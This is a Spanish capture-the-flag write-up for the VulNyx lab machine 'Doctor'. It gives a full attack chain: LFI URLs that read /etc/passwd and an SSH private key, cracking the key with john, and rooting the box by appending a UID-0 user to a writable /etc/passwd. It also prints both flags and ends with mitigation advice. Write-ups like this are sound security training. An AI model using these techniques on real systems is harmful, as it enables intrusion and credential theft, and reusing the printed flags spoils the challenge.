# Write-up: Doctor (VulNyx) - 192.168.1.138

**Autor:** Antigravity
**Fecha:** 2026-02-09  
**Dificultad:** Fácil/Media  

## 1. Introducción
Este write-up documenta el proceso de pruebas de penetración para la máquina "Doctor" de Vulnyx. El objetivo fue obtener acceso inicial para conseguir la flag de usuario y luego escalar privilegios a root para obtener la flag de root.

## 2. Reconocimiento

### 2.1. Escaneo con Nmap
Comenzamos con un escaneo de Nmap para identificar puertos y servicios abiertos.

```bash
nmap -sC -sV -oN initial_scan.txt 192.168.1.138
```

**Resultados:**
- **Puerto 22 (SSH):** OpenSSH 7.9p1 Debian 10+deb10u2
- **Puerto 80 (HTTP):** Apache httpd 2.4.38 (Debian)

### 2.2. Enumeración Web
Exploramos la aplicación web que se ejecuta en el puerto 80. Un escaneo con `gobuster` reveló varios directorios y archivos interesantes.

```bash
gobuster dir -u http://192.168.1.138/ -w /usr/share/wordlists/dirb/common.txt
```

Páginas encontradas:
- `/index.html`
- `/doctor-item.php` (Interesante)
- `/about.html`
- `/contact.html`

## 3. Análisis de Vulnerabilidades y Explotación

### 3.1. LFI en `doctor-item.php`
Al inspeccionar `doctor-item.php`, probamos vulnerabilidades de Inclusión de Archivos Locales (LFI) utilizando el parámetro `include`.

Payload probado:
```
http://192.168.1.138/doctor-item.php?include=../../../../../../../etc/passwd
```

El servidor devolvió el contenido de `/etc/passwd`, confirmando la vulnerabilidad LFI. Identificamos un usuario llamado `admin`.

### 3.2. Recuperación de la Flag de Usuario
Usando la vulnerabilidad LFI, recuperamos la flag de usuario del directorio home del administrador.

**URL:**
```
http://192.168.1.138/doctor-item.php?include=../../../../../../../home/admin/user.txt
```

**Flag (Usuario):** `0819e6dfb35db7c61353e4dce311b397`

## 4. Acceso Inicial

### 4.1. Extracción de Clave SSH
Intentamos recuperar la clave privada SSH del administrador a través de LFI.

**URL:**
```
http://192.168.1.138/doctor-item.php?include=../../../../../../../home/admin/.ssh/id_rsa
```

Descargamos con éxito la clave privada cifrada (`id_rsa`).

### 4.2. Cracking de la Passphrase SSH
Usamos `ssh2john` para convertir la clave a un formato de hash crackeable y luego usamos `john` (John the Ripper) con la lista de palabras `rockyou.txt` para descifrar la contraseña.

```bash
ssh2john admin_id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

**Contraseña encontrada:** `unicorn`

### 4.3. Inicio de Sesión SSH
Con la clave privada y la contraseña, iniciamos sesión como el usuario `admin`.

```bash
chmod 600 admin_id_rsa
ssh -i admin_id_rsa admin@192.168.1.138
```

Acceso concedido.

## 5. Escalada de Privilegios

### 5.1. Enumeración
Después de iniciar sesión, realizamos una enumeración básica. Verificamos binarios SUID, permisos de sudo (admin no podía ejecutar sudo) y permisos de archivos.

```bash
ls -l /etc/passwd
```

**Resultado:**
```
-rw----rw- 1 root root 1392 Dec 30  2024 /etc/passwd
```
¡El archivo `/etc/passwd` tenía permisos de escritura para todos! Esta es una mala configuración crítica.

### 5.2. Explotación
Dado que podíamos escribir en `/etc/passwd`, creamos un nuevo usuario con privilegios de root (UID 0, GID 0).

1.  **Generar Hash de Contraseña:**
    Generamos un hash para la contraseña `123456`.
    ```bash
    openssl passwd -1 -salt mypass 123456
    # Resultado: $1$mypass$LrFVntXU5IIGKlOHi67yY/
    ```

2.  **Añadir Usuario a `/etc/passwd`:**
    Añadimos el nuevo usuario `newroot` al archivo passwd.
    ```bash
    echo 'newroot:$1$mypass$LrFVntXU5IIGKlOHi67yY/:0:0:root:/root:/bin/bash' >> /etc/passwd
    ```

3.  **Cambiar de Usuario:**
    Cambiamos al nuevo usuario root.
    ```bash
    su newroot
    # Contraseña: 123456
    ```

### 5.3. Recuperación de la Flag de Root
Ahora identificados como root (uid=0), accedimos al directorio root y recuperamos la flag final.

```bash
cat /root/root.txt
```

**Flag (Root):** `dfde8cc67ed8819b2386dc74e472ecc6`

## 6. Conclusión
La máquina "Doctor" tenía una vulnerabilidad crítica de LFI en su aplicación web que permitió la exfiltración de credenciales sensibles (claves SSH). Los permisos débiles en `/etc/passwd` permitieron luego una escalada de privilegios trivial a root.

**Recomendaciones de Mitigación:**
1.  **Corregir LFI:** Validar y sanitizar todas las entradas de usuario en `doctor-item.php`. Se recomienda una lista blanca estricta de archivos permitidos.
2.  **Proteger Claves SSH:** Asegurar que archivos sensibles como `.ssh/id_rsa` no sean accesibles por el usuario del servidor web.
3.  **Corregir Permisos de Archivos:** Restaurar los permisos correctos en `/etc/passwd` (debería ser `644` y propiedad de root:root) para prevenir modificaciones no autorizadas.
